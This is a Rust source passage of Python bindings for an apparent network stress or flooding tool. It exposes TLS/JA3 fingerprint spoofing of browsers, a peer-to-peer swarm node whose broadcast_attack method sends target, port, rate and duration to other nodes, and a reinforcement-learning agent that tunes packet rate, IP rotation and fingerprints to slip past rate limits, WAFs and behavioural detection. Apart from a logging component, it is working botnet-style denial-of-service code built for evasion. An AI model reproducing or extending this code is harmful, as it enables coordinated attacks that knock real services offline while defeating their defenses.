/// Python-exposed JA3Spoofer for TLS fingerprint spoofing
///
/// **Validates: Requirements 2.1, 2.2** - TLS/JA3 Fingerprint Impersonator
#[pyclass]
pub struct PyJA3Spoofer {
    inner: parking_lot::RwLock<tls_spoof::JA3Spoofer>,
}

#[pymethods]
impl PyJA3Spoofer {
    /// Create a new JA3Spoofer with all built-in browser profiles
    #[new]
    fn new() -> Self {
        Self {
            inner: parking_lot::RwLock::new(tls_spoof::JA3Spoofer::new()),
        }
    }

    /// Set the active browser profile
    ///
    /// Available profiles: chrome_120, firefox_121, safari_17, iphone_15, android_14, curl
    fn set_profile(&self, name: &str) -> PyResult<()> {
        self.inner
            .write()
            .set_profile(name)
            .map_err(|e| PyRuntimeError::new_err(e))
    }

    /// List all available profile names
    fn list_profiles(&self) -> Vec<String> {
        self.inner
            .read()
            .list_profiles()
            .iter()
            .map(|s| s.to_string())
            .collect()
    }

    /// Build a TLS Client Hello packet for the current profile
    ///
    /// Args:
    ///     server_name: The SNI hostname to include in the Client Hello
    ///
    /// Returns:
    ///     bytes: The raw Client Hello packet
    fn build_client_hello(&self, server_name: &str) -> PyResult<Vec<u8>> {
        self.inner
            .read()
            .build_client_hello(server_name)
            .ok_or_else(|| PyRuntimeError::new_err("No profile selected"))
    }

    /// Get the expected JA3 hash for a profile
    fn get_profile_ja3(&self, name: &str) -> PyResult<String> {
        self.inner
            .read()
            .get_profile(name)
            .map(|p| p.ja3_hash.clone())
            .ok_or_else(|| PyRuntimeError::new_err(format!("Unknown profile: {}", name)))
    }

    /// Get profile details as a dictionary
    fn get_profile_details(&self, name: &str) -> PyResult<PyObject> {
        Python::with_gil(|py| {
            let spoofer = self.inner.read();
            let profile = spoofer
                .get_profile(name)
                .ok_or_else(|| PyRuntimeError::new_err(format!("Unknown profile: {}", name)))?;

            let dict = pyo3::types::PyDict::new_bound(py);
            dict.set_item("name", &profile.name)?;
            dict.set_item("ja3_hash", &profile.ja3_hash)?;
            dict.set_item("ssl_version", profile.ssl_version)?;
            dict.set_item(
                "cipher_suites",
                profile
                    .cipher_suites
                    .iter()
                    .map(|c| format!("0x{:04x}", c))
                    .collect::<Vec<_>>(),
            )?;
            dict.set_item(
                "extensions",
                profile
                    .extensions
                    .iter()
                    .map(|e| format!("0x{:04x}", e))
                    .collect::<Vec<_>>(),
            )?;
            dict.set_item(
                "elliptic_curves",
                profile
                    .elliptic_curves
                    .iter()
                    .map(|c| format!("0x{:04x}", c))
                    .collect::<Vec<_>>(),
            )?;
            dict.set_item("alpn_protocols", &profile.alpn_protocols)?;

            Ok(dict.into())
        })
    }

    /// Calculate the JA3 hash for a profile
    fn calculate_ja3(&self, name: &str) -> PyResult<String> {
        self.inner
            .read()
            .get_profile(name)
            .map(|p| p.calculate_ja3())
            .ok_or_else(|| PyRuntimeError::new_err(format!("Unknown profile: {}", name)))
    }
}

/// Python-exposed TlsProfile for custom fingerprint creation
#[pyclass]
pub struct PyTlsProfile {
    inner: tls_spoof::TlsProfile,
}

#[pymethods]
impl PyTlsProfile {
    /// Create Chrome 120 Windows 11 profile
    #[staticmethod]
    fn chrome_120() -> Self {
        Self {
            inner: tls_spoof::TlsProfile::chrome_120_win11(),
        }
    }

    /// Create Firefox 121 Windows 11 profile
    #[staticmethod]
    fn firefox_121() -> Self {
        Self {
            inner: tls_spoof::TlsProfile::firefox_121_win11(),
        }
    }

    /// Create Safari 17 macOS Sonoma profile
    #[staticmethod]
    fn safari_17() -> Self {
        Self {
            inner: tls_spoof::TlsProfile::safari_17_macos(),
        }
    }

    /// Create iPhone 15 Pro iOS 17 profile
    #[staticmethod]
    fn iphone_15() -> Self {
        Self {
            inner: tls_spoof::TlsProfile::iphone_15_ios17(),
        }
    }

    /// Create Android 14 Chrome profile
    #[staticmethod]
    fn android_14() -> Self {
        Self {
            inner: tls_spoof::TlsProfile::android_14_chrome(),
        }
    }

    /// Create curl/wget profile
    #[staticmethod]
    fn curl() -> Self {
        Self {
            inner: tls_spoof::TlsProfile::curl_default(),
        }
    }

    /// Get the profile name
    #[getter]
    fn name(&self) -> String {
        self.inner.name.clone()
    }

    /// Get the expected JA3 hash
    #[getter]
    fn ja3_hash(&self) -> String {
        self.inner.ja3_hash.clone()
    }

    /// Calculate the actual JA3 hash from profile parameters
    fn calculate_ja3(&self) -> String {
        self.inner.calculate_ja3()
    }

    /// Build a TLS Client Hello packet
    fn build_client_hello(&self, server_name: &str) -> Vec<u8> {
        self.inner.build_client_hello(server_name)
    }

    /// Verify that calculated JA3 matches expected hash
    fn verify_ja3(&self) -> bool {
        self.inner.calculate_ja3() == self.inner.ja3_hash
    }
}

/// Build a TLS Client Hello packet with a specific browser profile
///
/// **Validates: Requirements 2.1, 2.2, 2.3, 2.4, 2.5, 2.6**
#[pyfunction]
fn build_tls_client_hello(profile: &str, server_name: &str) -> PyResult<Vec<u8>> {
    let mut spoofer = tls_spoof::JA3Spoofer::new();
    spoofer
        .set_profile(profile)
        .map_err(|e| PyRuntimeError::new_err(e))?;
    spoofer
        .build_client_hello(server_name)
        .ok_or_else(|| PyRuntimeError::new_err("Failed to build Client Hello"))
}

/// Get the JA3 hash for a browser profile
#[pyfunction]
fn get_ja3_hash(profile: &str) -> PyResult<String> {
    let spoofer = tls_spoof::JA3Spoofer::new();
    spoofer
        .get_profile(profile)
        .map(|p| p.ja3_hash.clone())
        .ok_or_else(|| PyRuntimeError::new_err(format!("Unknown profile: {}", profile)))
}

/// List all available TLS profiles
#[pyfunction]
fn list_tls_profiles() -> Vec<String> {
    let spoofer = tls_spoof::JA3Spoofer::new();
    spoofer
        .list_profiles()
        .iter()
        .map(|s| s.to_string())
        .collect()
}

/// Python-exposed SharedMemoryWriter for real-time telemetry
///
/// **Validates: Requirements 8.1, 8.3** - Shared memory writer with microsecond updates
#[pyclass]
pub struct PySharedMemoryWriter {
    inner: Arc<parking_lot::Mutex<shared_memory::AutoUpdatingWriter>>,
}

#[pymethods]
impl PySharedMemoryWriter {
    /// Create a new shared memory writer
    #[new]
    #[pyo3(signature = (name="netstress_stats", update_interval_us=1000))]
    fn new(name: &str, update_interval_us: u64) -> PyResult<Self> {
        let writer =
            shared_memory::AutoUpdatingWriter::new(name, update_interval_us).map_err(|e| {
                PyRuntimeError::new_err(format!("Failed to create shared memory writer: {}", e))
            })?;

        Ok(Self {
            inner: Arc::new(parking_lot::Mutex::new(writer)),
        })
    }

    /// Write statistics to shared memory
    fn write_stats(&self, stats_dict: &Bound<'_, pyo3::types::PyDict>) -> PyResult<()> {
        let stats = shared_memory::SharedStatsSnapshot {
            packets_sent: stats_dict
                .get_item("packets_sent")?
                .map(|v| v.extract())
                .unwrap_or(Ok(0u64))?,
            bytes_sent: stats_dict
                .get_item("bytes_sent")?
                .map(|v| v.extract())
                .unwrap_or(Ok(0u64))?,
            pps: stats_dict
                .get_item("pps")?
                .map(|v| v.extract())
                .unwrap_or(Ok(0.0f64))?,
            bps: stats_dict
                .get_item("bps")?
                .map(|v| v.extract())
                .unwrap_or(Ok(0.0f64))?,
            errors: stats_dict
                .get_item("errors")?
                .map(|v| v.extract())
                .unwrap_or(Ok(0u64))?,
            duration_us: stats_dict
                .get_item("duration_us")?
                .map(|v| v.extract())
                .unwrap_or(Ok(0u64))?,
            backend: shared_memory::BackendType::from(
                stats_dict
                    .get_item("backend")?
                    .map(|v| v.extract::<String>())
                    .unwrap_or(Ok("rust".to_string()))?
                    .as_str(),
            ),
            thread_count: stats_dict
                .get_item("thread_count")?
                .map(|v| v.extract())
                .unwrap_or(Ok(1u32))?,
            backend_stats: [0.0; 4], // Can be extended later
        };

        self.inner
            .lock()
            .write_stats(&stats)
            .map_err(|e| PyRuntimeError::new_err(format!("Failed to write stats: {}", e)))
    }

    /// Start automatic updates from engine stats
    fn start_auto_update(
        &self,
        engine: &PacketEngine,
        backend: &str,
        thread_count: u32,
    ) -> PyResult<()> {
        let backend_type = shared_memory::BackendType::from(backend);
        // Use the existing Arc<RwLock<Stats>> directly - the shared memory expects this
        let stats = Arc::clone(&engine.stats);

        self.inner
            .lock()
            .start_auto_update(stats, backend_type, thread_count);
        Ok(())
    }

    /// Stop automatic updates
    fn stop_auto_update(&self) {
        self.inner.lock().stop_auto_update();
    }

    /// Check if writer is valid
    fn is_valid(&self) -> bool {
        self.inner.lock().is_valid()
    }
}

/// Python-exposed KademliaNode for P2P coordination
#[pyclass]
pub struct PyKademliaNode {
    inner: Arc<tokio::sync::Mutex<kademlia::KademliaNode>>,
    runtime: Arc<tokio::runtime::Runtime>,
}

#[pymethods]
impl PyKademliaNode {
    /// Create a new Kademlia node
    #[new]
    fn new(bind_addr: &str) -> PyResult<Self> {
        let addr = bind_addr.parse()
            .map_err(|_| PyRuntimeError::new_err(format!("Invalid bind address: {}", bind_addr)))?;
        
        let runtime = Arc::new(tokio::runtime::Runtime::new()
            .map_err(|e| PyRuntimeError::new_err(format!("Failed to create runtime: {}", e)))?);
        
        let node = runtime.block_on(async {
            kademlia::KademliaNode::new(addr)
        }).map_err(|e| PyRuntimeError::new_err(format!("Failed to create Kademlia node: {}", e)))?;

        Ok(Self {
            inner: Arc::new(tokio::sync::Mutex::new(node)),
            runtime,
        })
    }

    /// Get the node ID as hex string
    fn node_id(&self, py: Python<'_>) -> PyResult<String> {
        py.allow_threads(|| {
            self.runtime.block_on(async {
                let node = self.inner.lock().await;
                let id = node.node_id();
                Ok(hex::encode(id.as_bytes()))
            })
        })
    }

    /// Get the bind address
    fn bind_addr(&self, py: Python<'_>) -> PyResult<String> {
        py.allow_threads(|| {
            self.runtime.block_on(async {
                let node = self.inner.lock().await;
                Ok(node.bind_addr().to_string())
            })
        })
    }

    /// Bootstrap the node with seed nodes
    fn bootstrap(&self, py: Python<'_>, seed_nodes: Vec<String>) -> PyResult<()> {
        py.allow_threads(|| {
            self.runtime.block_on(async {
                let mut node = self.inner.lock().await;
                let addrs: Result<Vec<_>, _> = seed_nodes.iter()
                    .map(|s| s.parse())
                    .collect();
                let addrs = addrs.map_err(|_| PyRuntimeError::new_err("Invalid seed node address"))?;
                
                node.bootstrap(&addrs).await
                    .map_err(|e| PyRuntimeError::new_err(format!("Bootstrap failed: {}", e)))
            })
        })
    }

    /// Ping a node
    fn ping_node(&self, py: Python<'_>, addr: &str) -> PyResult<()> {
        py.allow_threads(|| {
            self.runtime.block_on(async {
                let node = self.inner.lock().await;
                let addr = addr.parse()
                    .map_err(|_| PyRuntimeError::new_err(format!("Invalid address: {}", addr)))?;
                
                node.ping_node(addr).await
                    .map_err(|e| PyRuntimeError::new_err(format!("Ping failed: {}", e)))
            })
        })
    }

    /// Find nodes closest to a target
    fn find_node(&self, py: Python<'_>, target_hex: &str) -> PyResult<Vec<PyObject>> {
        py.allow_threads(|| {
            self.runtime.block_on(async {
                let node = self.inner.lock().await;
                let target_bytes = hex::decode(target_hex)
                    .map_err(|_| PyRuntimeError::new_err("Invalid hex target"))?;
                
                if target_bytes.len() != 20 {
                    return Err(PyRuntimeError::new_err("Target must be 20 bytes (160 bits)"));
                }
                
                let mut target_array = [0u8; 20];
                target_array.copy_from_slice(&target_bytes);
                let target = kademlia::NodeId::from_bytes(target_array);
                
                let peers = node.find_node(&target).await
                    .map_err(|e| PyRuntimeError::new_err(format!("Find node failed: {}", e)))?;
                
                Python::with_gil(|py| {
                    let result: PyResult<Vec<PyObject>> = peers.into_iter().map(|peer| {
                        let dict = pyo3::types::PyDict::new_bound(py);
                        dict.set_item("node_id", hex::encode(peer.node_id.as_bytes()))?;
                        dict.set_item("address", peer.address.to_string())?;
                        Ok(dict.into())
                    }).collect();
                    result
                })
            })
        })
    }

    /// Store a value in the DHT
    fn store(&self, py: Python<'_>, key_hex: &str, value: &[u8]) -> PyResult<()> {
        py.allow_threads(|| {
            self.runtime.block_on(async {
                let node = self.inner.lock().await;
                let key_bytes = hex::decode(key_hex)
                    .map_err(|_| PyRuntimeError::new_err("Invalid hex key"))?;
                
                if key_bytes.len() != 20 {
                    return Err(PyRuntimeError::new_err("Key must be 20 bytes (160 bits)"));
                }
                
                let mut key_array = [0u8; 20];
                key_array.copy_from_slice(&key_bytes);
                
                node.store(key_array, value.to_vec()).await
                    .map_err(|e| PyRuntimeError::new_err(format!("Store failed: {}", e)))
            })
        })
    }

    /// Find a value in the DHT
    fn find_value(&self, py: Python<'_>, key_hex: &str) -> PyResult<Option<Vec<u8>>> {
        py.allow_threads(|| {
            self.runtime.block_on(async {
                let node = self.inner.lock().await;
                let key_bytes = hex::decode(key_hex)
                    .map_err(|_| PyRuntimeError::new_err("Invalid hex key"))?;
                
                if key_bytes.len() != 20 {
                    return Err(PyRuntimeError::new_err("Key must be 20 bytes (160 bits)"));
                }
                
                let mut key_array = [0u8; 20];
                key_array.copy_from_slice(&key_bytes);
                
                node.find_value(key_array).await
                    .map_err(|e| PyRuntimeError::new_err(format!("Find value failed: {}", e)))
            })
        })
    }

    /// Broadcast an attack command to the swarm
    fn broadcast_attack(&self, py: Python<'_>, config_dict: &Bound<'_, pyo3::types::PyDict>) -> PyResult<()> {
        // Extract attack config from Python dict before allow_threads
        let target: String = config_dict.get_item("target")?
            .ok_or_else(|| PyRuntimeError::new_err("Missing 'target' in config"))?
            .extract()?;
        let port: u16 = config_dict.get_item("port")?
            .ok_or_else(|| PyRuntimeError::new_err("Missing 'port' in config"))?
            .extract()?;
        let protocol: String = config_dict.get_item("protocol")?
            .ok_or_else(|| PyRuntimeError::new_err("Missing 'protocol' in config"))?
            .extract()?;
        let duration: u64 = config_dict.get_item("duration")?
            .ok_or_else(|| PyRuntimeError::new_err("Missing 'duration' in config"))?
            .extract()?;
        let rate: u64 = config_dict.get_item("rate")?
            .ok_or_else(|| PyRuntimeError::new_err("Missing 'rate' in config"))?
            .extract()?;
        let swarm_id_hex: String = config_dict.get_item("swarm_id")?
            .ok_or_else(|| PyRuntimeError::new_err("Missing 'swarm_id' in config"))?
            .extract()?;
        
        let swarm_id_bytes = hex::decode(swarm_id_hex)
            .map_err(|_| PyRuntimeError::new_err("Invalid hex swarm_id"))?;
        if swarm_id_bytes.len() != 20 {
            return Err(PyRuntimeError::new_err("swarm_id must be 20 bytes (160 bits)"));
        }
        let mut swarm_id = [0u8; 20];
        swarm_id.copy_from_slice(&swarm_id_bytes);
        
        let config = kademlia::AttackConfig {
            target,
            port,
            protocol,
            duration,
            rate,
            swarm_id,
        };

        py.allow_threads(|| {
            self.runtime.block_on(async {
                let node = self.inner.lock().await;
                node.broadcast_attack(&config).await
                    .map_err(|e| PyRuntimeError::new_err(format!("Broadcast failed: {}", e)))
            })
        })
    }

    /// Join a swarm
    fn join_swarm(&self, py: Python<'_>, swarm_id: &[u8]) -> PyResult<()> {
        py.allow_threads(|| {
            self.runtime.block_on(async {
                let mut node = self.inner.lock().await;
                node.join_swarm(swarm_id).await
                    .map_err(|e| PyRuntimeError::new_err(format!("Join swarm failed: {}", e)))
            })
        })
    }

    /// Find peers in a swarm
    fn find_swarm_peers(&self, py: Python<'_>, swarm_id: &[u8]) -> PyResult<Vec<PyObject>> {
        py.allow_threads(|| {
            self.runtime.block_on(async {
                let node = self.inner.lock().await;
                let peers = node.find_swarm_peers(swarm_id).await
                    .map_err(|e| PyRuntimeError::new_err(format!("Find swarm peers failed: {}", e)))?;
                
                Python::with_gil(|py| {
                    let result: PyResult<Vec<PyObject>> = peers.into_iter().map(|peer| {
                        let dict = pyo3::types::PyDict::new_bound(py);
                        dict.set_item("node_id", hex::encode(peer.node_id.as_bytes()))?;
                        dict.set_item("address", peer.address.to_string())?;
                        Ok(dict.into())
                    }).collect();
                    result
                })
            })
        })
    }

    /// Start the node's message handling loop (non-blocking)
    fn start(&self, py: Python<'_>) -> PyResult<()> {
        let inner = Arc::clone(&self.inner);
        let runtime = Arc::clone(&self.runtime);
        
        py.allow_threads(|| {
            runtime.spawn(async move {
                let node = inner.lock().await;
                if let Err(e) = node.run().await {
                    tracing::error!("Kademlia node error: {}", e);
                }
            });
        });
        
        Ok(())
    }
}

/// Python-exposed AdaptiveScaler for real-time performance scaling
#[pyclass]
pub struct PyAdaptiveScaler {
    inner: Arc<parking_lot::Mutex<adaptive::AdaptiveScaler>>,
}

#[pymethods]
impl PyAdaptiveScaler {
    /// Create a new adaptive scaler with auto-detected hardware
    #[new]
    fn new() -> Self {
        let hardware = adaptive::HardwareProfile::detect();
        let scaler = adaptive::AdaptiveScaler::new(hardware);
        
        Self {
            inner: Arc::new(parking_lot::Mutex::new(scaler)),
        }
    }

    /// Create with specific hardware profile
    #[staticmethod]
    fn with_hardware(cpu_cores: u32, total_ram_gb: u64, nic_speed_mbps: u32) -> Self {
        let hardware = adaptive::HardwareProfile {
            cpu_cores,
            total_ram: total_ram_gb * 1024 * 1024 * 1024,
            nic_speed: nic_speed_mbps,
            tier: adaptive::HardwareProfile::classify_tier(cpu_cores, total_ram_gb * 1024 * 1024 * 1024, nic_speed_mbps),
        };
        let scaler = adaptive::AdaptiveScaler::new(hardware);
        
        Self {
            inner: Arc::new(parking_lot::Mutex::new(scaler)),
        }
    }

    /// Start adaptive scaling
    fn start(&self) {
        self.inner.lock().start();
    }

    /// Stop adaptive scaling
    fn stop(&self) {
        self.inner.lock().stop();
    }

    /// Update packet statistics for monitoring
    fn update_packet_stats(&self, sent: u64, dropped: u64) {
        self.inner.lock().update_packet_stats(sent, dropped);
    }

    /// Check if adjustment is needed and return configuration changes
    fn check_and_adjust(&self) -> PyResult<Option<PyObject>> {
        let adjustment = self.inner.lock().check_and_adjust();
        
        if let Some(adj) = adjustment {
            Python::with_gil(|py| {
                let dict = pyo3::types::PyDict::new_bound(py);
                
                if let Some(threads) = adj.thread_count {
                    dict.set_item("thread_count", threads)?;
                }
                if let Some(buffer_size) = adj.buffer_size {
                    dict.set_item("buffer_size", buffer_size)?;
                }
                if let Some(rate_limit) = adj.rate_limit {
                    dict.set_item("rate_limit", rate_limit)?;
                }
                if let Some(batch_size) = adj.batch_size {
                    dict.set_item("batch_size", batch_size)?;
                }
                dict.set_item("reason", adj.reason)?;
                
                Ok(Some(dict.into()))
            })
        } else {
            Ok(None)
        }
    }

    /// Get current performance metrics
    fn get_metrics(&self) -> PyResult<PyObject> {
        let metrics = self.inner.lock().get_metrics();
        
        Python::with_gil(|py| {
            let dict = pyo3::types::PyDict::new_bound(py);
            dict.set_item("cpu_usage", metrics.cpu_usage)?;
            dict.set_item("memory_usage", metrics.memory_usage)?;
            dict.set_item("packet_loss", metrics.packet_loss)?;
            dict.set_item("current_pps", metrics.current_pps)?;
            dict.set_item("target_pps", metrics.target_pps)?;
            dict.set_item("timestamp", metrics.timestamp_secs)?;
            Ok(dict.into())
        })
    }

    /// Get current configuration
    fn get_current_config(&self) -> PyResult<PyObject> {
        let config = self.inner.lock().get_current_config().clone();
        
        Python::with_gil(|py| {
            let dict = pyo3::types::PyDict::new_bound(py);
            dict.set_item("threads", config.threads)?;
            dict.set_item("buffer_size", config.buffer_size)?;
            dict.set_item("rate_limit", config.rate_limit)?;
            dict.set_item("batch_size", config.batch_size)?;
            dict.set_item("target_pps", config.target_pps)?;
            Ok(dict.into())
        })
    }

    /// Get adjustment history
    fn get_adjustment_history(&self) -> PyResult<Vec<PyObject>> {
        let history = self.inner.lock().get_adjustment_history();
        
        Python::with_gil(|py| {
            let result: PyResult<Vec<PyObject>> = history.into_iter().map(|adj| {
                let dict = pyo3::types::PyDict::new_bound(py);
                
                if let Some(threads) = adj.thread_count {
                    dict.set_item("thread_count", threads)?;
                }
                if let Some(buffer_size) = adj.buffer_size {
                    dict.set_item("buffer_size", buffer_size)?;
                }
                if let Some(rate_limit) = adj.rate_limit {
                    dict.set_item("rate_limit", rate_limit)?;
                }
                if let Some(batch_size) = adj.batch_size {
                    dict.set_item("batch_size", batch_size)?;
                }
                dict.set_item("reason", adj.reason)?;
                
                Ok(dict.into())
            }).collect();
            result
        })
    }

    /// Check if adaptive scaling is active
    fn is_active(&self) -> bool {
        self.inner.lock().is_active()
    }

    /// Get hardware profile information
    fn get_hardware_profile(&self) -> PyResult<PyObject> {
        // We need to access the hardware profile from the scaler
        // For now, let's detect it again
        let hardware = adaptive::HardwareProfile::detect();
        
        Python::with_gil(|py| {
            let dict = pyo3::types::PyDict::new_bound(py);
            dict.set_item("cpu_cores", hardware.cpu_cores)?;
            dict.set_item("total_ram_gb", hardware.total_ram / (1024 * 1024 * 1024))?;
            dict.set_item("nic_speed_mbps", hardware.nic_speed)?;
            dict.set_item("tier", format!("{:?}", hardware.tier))?;
            Ok(dict.into())
        })
    }
}

/// Python-exposed AuditLogger
#[pyclass]
pub struct PyAuditLogger {
    inner: Arc<audit::AuditLogger>,
}

#[pymethods]
impl PyAuditLogger {
    #[new]
    fn new() -> Self {
        Self {
            inner: Arc::new(audit::AuditLogger::new()),
        }
    }

    /// Create with file output
    #[staticmethod]
    fn with_file(path: &str) -> PyResult<Self> {
        let logger = audit::AuditLogger::with_file(path)
            .map_err(|e| PyRuntimeError::new_err(format!("Failed to create audit log: {}", e)))?;
        Ok(Self {
            inner: Arc::new(logger),
        })
    }

    /// Log engine start
    fn log_engine_start(&self, target: &str, config: &str) {
        self.inner.log_engine_start(target, config);
    }

    /// Log engine stop
    fn log_engine_stop(&self, stats: &str) {
        self.inner.log_engine_stop(stats);
    }

    /// Log target authorized
    fn log_target_authorized(&self, target: &str) {
        self.inner.log_target_authorized(target);
    }

    /// Log target rejected
    fn log_target_rejected(&self, target: &str, reason: &str) {
        self.inner.log_target_rejected(target, reason);
    }

    /// Log emergency stop
    fn log_emergency_stop(&self, reason: &str) {
        self.inner.log_emergency_stop(reason);
    }

    /// Log error
    fn log_error(&self, error: &str) {
        self.inner.log_error(error);
    }

    /// Verify chain integrity
    fn verify_chain(&self) -> PyResult<PyObject> {
        Python::with_gil(|py| {
            let result = self.inner.verify_chain();
            let dict = pyo3::types::PyDict::new_bound(py);
            dict.set_item("valid", result.valid)?;
            dict.set_item("entries_checked", result.entries_checked)?;
            dict.set_item("first_invalid", result.first_invalid)?;
            dict.set_item("error", result.error)?;
            Ok(dict.into())
        })
    }

    /// Export to JSON
    fn export_json(&self) -> String {
        self.inner.export_json()
    }

    /// Get entry count
    fn entry_count(&self) -> usize {
        self.inner.entries().len()
    }
}

/// Python-exposed RL Agent for attack optimization
/// 
/// **Validates: Requirements 7.1, 7.2, 7.3, 7.4, 7.5** - RL agent with ONNX support
#[cfg(feature = "rl_agent")]
#[pyclass]
pub struct PyRLAgent {
    inner: Arc<parking_lot::Mutex<rl_agent::RLAgent>>,
}

#[cfg(feature = "rl_agent")]
#[pymethods]
impl PyRLAgent {
    /// Create a new RL agent with optional ONNX model
    #[new]
    fn new(model_path: Option<String>) -> PyResult<Self> {
        let agent = rl_agent::RLAgent::new(model_path);
        Ok(Self {
            inner: Arc::new(parking_lot::Mutex::new(agent)),
        })
    }

    /// Initialize the agent and load model
    fn initialize(&self) -> PyResult<()> {
        self.inner.lock().initialize()
            .map_err(|e| PyRuntimeError::new_err(format!("Failed to initialize RL agent: {}", e)))
    }

    /// Update current state from metrics
    fn update_state(&self, 
                   packet_rate: u64,
                   packet_size: u16,
                   thread_count: u8,
                   protocol: &str,
                   evasion_level: u8,
                   current_pps: f64,
                   current_bps: f64,
                   errors: u64,
                   packets_sent: u64,
                   target_response_ms: f64,
                   target_errors: u64,
                   target_requests: u64,
                   network_latency_ms: f64,
                   packet_loss_rate: f64,
                   congestion: f64,
                   rate_limit_detected: bool,
                   waf_detected: bool,
                   behavioral_detected: bool,
                   defense_confidence: f64,
                   cpu_percent: f64,
                   memory_percent: f64) -> PyResult<()> {
        
        let defenses = rl_agent::DefenseState {
            rate_limit_detected,
            waf_detected,
            behavioral_detected,
            confidence: defense_confidence,
            detection_time: std::time::Instant::now(),
        };

        let state = rl_agent::ObservationState::from_metrics(
            packet_rate, packet_size, thread_count, protocol, evasion_level,
            current_pps, current_bps, errors, packets_sent,
            target_response_ms, target_errors, target_requests,
            network_latency_ms, packet_loss_rate, congestion,
            &defenses, cpu_percent, memory_percent,
            std::time::Instant::now()
        );

        self.inner.lock().update_state(state)
            .map_err(|e| PyRuntimeError::new_err(format!("Failed to update state: {}", e)))
    }

    /// Select next action
    fn select_action(&self) -> PyResult<PyObject> {
        let action = self.inner.lock().select_action()
            .map_err(|e| PyRuntimeError::new_err(format!("Failed to select action: {}", e)))?;

        Python::with_gil(|py| {
            let dict = pyo3::types::PyDict::new_bound(py);
            dict.set_item("action_type", format!("{:?}", action.action_type))?;
            dict.set_item("magnitude", action.magnitude)?;
            
            let params_dict = pyo3::types::PyDict::new_bound(py);
            for (key, value) in &action.parameters {
                params_dict.set_item(key, *value)?;
            }
            dict.set_item("parameters", params_dict)?;
            
            Ok(dict.into())
        })
    }

    /// Execute action on attack configuration
    fn execute_action(&self, action_dict: &Bound<'_, pyo3::types::PyDict>, config_dict: &Bound<'_, pyo3::types::PyDict>) -> PyResult<PyObject> {
        // Parse action from dict
        let action_type_str: String = action_dict.get_item("action_type")?
            .ok_or_else(|| PyRuntimeError::new_err("Missing 'action_type' in action"))?
            .extract()?;
        let magnitude: f32 = action_dict.get_item("magnitude")?
            .ok_or_else(|| PyRuntimeError::new_err("Missing 'magnitude' in action"))?
            .extract()?;

        // Parse action type
        let action_type = match action_type_str.as_str() {
            "IncreasePPS" => rl_agent::ActionType::IncreasePPS,
            "DecreasePPS" => rl_agent::ActionType::DecreasePPS,
            "IncreasePacketSize" => rl_agent::ActionType::IncreasePacketSize,
            "DecreasePacketSize" => rl_agent::ActionType::DecreasePacketSize,
            "IncreaseThreads" => rl_agent::ActionType::IncreaseThreads,
            "DecreaseThreads" => rl_agent::ActionType::DecreaseThreads,
            "SwitchJA4Chrome" => rl_agent::ActionType::SwitchJA4Chrome,
            "SwitchJA4Firefox" => rl_agent::ActionType::SwitchJA4Firefox,
            "SwitchJA4Safari" => rl_agent::ActionType::SwitchJA4Safari,
            "EnableTimingRandomization" => rl_agent::ActionType::EnableTimingRandomization,
            "NoChange" => rl_agent::ActionType::NoChange,
            _ => return Err(PyRuntimeError::new_err(format!("Unknown action type: {}", action_type_str))),
        };

        let action = rl_agent::Action::with_magnitude(action_type, magnitude);

        // Parse config from dict
        let mut config = rl_agent::AttackConfig {
            packet_rate: config_dict.get_item("packet_rate")?.unwrap_or_else(|| 10000.into()).extract()?,
            packet_size: config_dict.get_item("packet_size")?.unwrap_or_else(|| 1472.into()).extract()?,
            thread_count: config_dict.get_item("thread_count")?.unwrap_or_else(|| 4.into()).extract()?,
            protocol: config_dict.get_item("protocol")?.unwrap_or_else(|| "UDP".into()).extract()?,
            evasion_level: config_dict.get_item("evasion_level")?.unwrap_or_else(|| 0.into()).extract()?,
            ..Default::default()
        };

        // Execute action
        self.inner.lock().execute_action(&action, &mut config)
            .map_err(|e| PyRuntimeError::new_err(format!("Failed to execute action: {}", e)))?;

        // Return updated config
        Python::with_gil(|py| {
            let dict = pyo3::types::PyDict::new_bound(py);
            dict.set_item("packet_rate", config.packet_rate)?;
            dict.set_item("packet_size", config.packet_size)?;
            dict.set_item("thread_count", config.thread_count)?;
            dict.set_item("protocol", config.protocol)?;
            dict.set_item("evasion_level", config.evasion_level)?;
            dict.set_item("ja4_profile", config.ja4_profile)?;
            dict.set_item("window_size", config.window_size)?;
            dict.set_item("burst_mode", config.burst_mode)?;
            dict.set_item("ip_rotation", config.ip_rotation)?;
            dict.set_item("user_agent_rotation", config.user_agent_rotation)?;
            dict.set_item("timing_randomization", config.timing_randomization)?;
            dict.set_item("attack_mode", config.attack_mode)?;
            Ok(dict.into())
        })
    }

    /// Update agent with reward from last action
    fn update_with_reward(&self, reward: f32) {
        self.inner.lock().update_with_reward(reward);
    }

    /// Get action statistics
    fn get_statistics(&self) -> PyResult<PyObject> {
        let stats = self.inner.lock().get_action_statistics();
        
        Python::with_gil(|py| {
            let dict = pyo3::types::PyDict::new_bound(py);
            for (key, value) in stats {
                dict.set_item(key, value.to_string())?;
            }
            Ok(dict.into())
        })
    }

    /// Get best performing actions
    fn get_best_actions(&self, top_n: usize) -> PyResult<Vec<PyObject>> {
        let best_actions = self.inner.lock().get_best_actions(top_n);
        
        Python::with_gil(|py| {
            let result: PyResult<Vec<PyObject>> = best_actions.into_iter().map(|(action_type, reward)| {
                let dict = pyo3::types::PyDict::new_bound(py);
                dict.set_item("action_type", format!("{:?}", action_type))?;
                dict.set_item("average_reward", reward)?;
                Ok(dict.into())
            }).collect();
            result
        })
    }

    /// Reset agent for new episode
    fn reset(&self) {
        self.inner.lock().reset();
    }

    /// Save agent state
    fn save_state(&self, path: &str) -> PyResult<()> {
        self.inner.lock().save_state(path)
            .map_err(|e| PyRuntimeError::new_err(format!("Failed to save state: {}", e)))
    }

    /// Load agent state
    fn load_state(&self, path: &str) -> PyResult<()> {
        self.inner.lock().load_state(path)
            .map_err(|e| PyRuntimeError::new_err(format!("Failed to load state: {}", e)))
    }

    /// Check if using ONNX model
    fn is_using_model(&self) -> bool {
        self.inner.lock().is_using_model()
    }
}

/// Python-exposed RL Agent (fallback for non-RL builds)
#[cfg(not(feature = "rl_agent"))]
#[pyclass]
pub struct PyRLAgent;

#[cfg(not(feature = "rl_agent"))]
#[pymethods]
impl PyRLAgent {
    #[new]
    fn new(_model_path: Option<String>) -> PyResult<Self> {
        Err(PyRuntimeError::new_err("RL agent requires 'rl_agent' feature to be enabled"))
    }
}

/// Create RL agent with ONNX model
#[cfg(feature = "rl_agent")]
#[pyfunction]
fn create_rl_agent(model_path: Option<String>) -> PyResult<PyRLAgent> {
    PyRLAgent::new(model_path)
}

/// Create RL agent (stub for non-RL builds)
#[cfg(not(feature = "rl_agent"))]
#[pyfunction]
